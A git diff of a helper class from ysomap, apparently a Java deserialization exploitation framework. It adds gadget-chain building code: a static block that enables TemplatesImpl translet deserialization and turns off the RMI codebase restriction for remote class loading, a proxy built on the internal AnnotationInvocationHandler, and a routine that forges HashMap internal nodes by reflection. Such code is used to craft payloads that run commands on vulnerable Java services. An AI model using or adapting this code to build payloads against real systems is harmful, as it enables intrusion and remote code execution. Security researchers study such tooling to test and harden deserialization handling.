@@ -1,96 +1,73 @@
 package ysomap.util;
 
-import org.reflections.Reflections;
-import ysomap.gadget.payload.ObjectPayload;
+import java.lang.reflect.*;
+import java.util.HashMap;
+import java.util.Map;
 
-import java.lang.reflect.Modifier;
-import java.util.Iterator;
-import java.util.Set;
+import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
 
 /**
  * @author wh1t3P1g
  * @since 2020/2/11
  */
 public class PayloadHelper {
+    static {
+        // special case for using TemplatesImpl gadgets with a SecurityManager enabled
+        System.setProperty(DESERIALIZE_TRANSLET, "true");
+
+        // for RMI remote loading
+        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
+    }
+
+    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
 
 
-    // get payload classes by classpath scanning
-    public static Set<Class<? extends ObjectPayload>> getPayloadClasses () {
-        final Reflections reflections = new Reflections(ObjectPayload.class.getPackage().getName());
-        final Set<Class<? extends ObjectPayload>> payloadTypes = reflections.getSubTypesOf(ObjectPayload.class);
-        for (Iterator<Class<? extends ObjectPayload>> iterator = payloadTypes.iterator(); iterator.hasNext(); ) {
-            Class<? extends ObjectPayload> pc = iterator.next();
-            if ( pc.isInterface() || Modifier.isAbstract(pc.getModifiers()) ) {
-                iterator.remove();
-            }
-        }
-        return payloadTypes;
+    public static <T> T createMemoitizedProxy (final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces ) throws Exception {
+        return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
     }
 
 
-//    @SuppressWarnings ( "unchecked" )
-//    public static Class<? extends ObjectPayload> getPayloadClass ( final String className ) {
-//        Class<? extends ObjectPayload> clazz = null;
-//        try {
-//            clazz = (Class<? extends ObjectPayload>) Class.forName(className);
-//        }
-//        catch ( Exception e1 ) {}
-//        if ( clazz == null ) {
-//            try {
-//                return clazz = (Class<? extends ObjectPayload>) Class
-//                        .forName(GeneratePayload.class.getPackage().getName() + ".payloads." + className);
-//            }
-//            catch ( Exception e2 ) {}
-//        }
-//        if ( clazz != null && !ObjectPayload.class.isAssignableFrom(clazz) ) {
-//            clazz = null;
-//        }
-//        return clazz;
-//    }
-//
-//
-//    public static Object makePayloadObject ( String payloadType, String payloadArg ) {
-//        final Class<? extends ObjectPayload> payloadClass = getPayloadClass(payloadType);
-//        if ( payloadClass == null || !ObjectPayload.class.isAssignableFrom(payloadClass) ) {
-//            throw new IllegalArgumentException("Invalid payload type '" + payloadType + "'");
-//
-//        }
-//
-//        final Object payloadObject;
-//        try {
-//            final ObjectPayload payload = payloadClass.newInstance();
-//            payloadObject = payload.getObject(payloadArg);
-//        }
-//        catch ( Exception e ) {
-//            throw new IllegalArgumentException("Failed to construct payload", e);
-//        }
-//        return payloadObject;
-//    }
-//
-//
-//    @SuppressWarnings ( "unchecked" )
-//    public static void releasePayload ( ObjectPayload payload, Object object ) throws Exception {
-//        if ( payload instanceof ReleaseableObjectPayload) {
-//            ( (ReleaseableObjectPayload) payload ).release(object);
-//        }
-//    }
-//
-//
-//    public static void releasePayload ( String payloadType, Object payloadObject ) {
-//        final Class<? extends ObjectPayload> payloadClass = getPayloadClass(payloadType);
-//        if ( payloadClass == null || !ObjectPayload.class.isAssignableFrom(payloadClass) ) {
-//            throw new IllegalArgumentException("Invalid payload type '" + payloadType + "'");
-//
-//        }
-//
-//        try {
-//            final ObjectPayload payload = payloadClass.newInstance();
-//            releasePayload(payload, payloadObject);
-//        }
-//        catch ( Exception e ) {
-//            e.printStackTrace();
-//        }
-//
-//    }
+    public static InvocationHandler createMemoizedInvocationHandler (final Map<String, Object> map ) throws Exception {
+        return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
+    }
 
+
+    public static <T> T createProxy ( final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces ) {
+        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
+        allIfaces[ 0 ] = iface;
+        if ( ifaces.length > 0 ) {
+            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
+        }
+        return iface.cast(Proxy.newProxyInstance(PayloadHelper.class.getClassLoader(), allIfaces, ih));
+    }
+
+
+    public static Map<String, Object> createMap ( final String key, final Object val ) {
+        final Map<String, Object> map = new HashMap<String, Object>();
+        map.put(key, val);
+        return map;
+    }
+
+
+
+    public static HashMap makeMap ( Object v1, Object v2 ) throws Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException,
+            IllegalAccessException, InvocationTargetException {
+        HashMap s = new HashMap();
+        Reflections.setFieldValue(s, "size", 2);
+        Class nodeC;
+        try {
+            nodeC = Class.forName("java.util.HashMap$Node");
+        }
+        catch ( ClassNotFoundException e ) {
+            nodeC = Class.forName("java.util.HashMap$Entry");
+        }
+        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
+        Reflections.setAccessible(nodeCons);
+
+        Object tbl = Array.newInstance(nodeC, 2);
+        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
+        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
+        Reflections.setFieldValue(s, "table", tbl);
+        return s;
+    }
 }
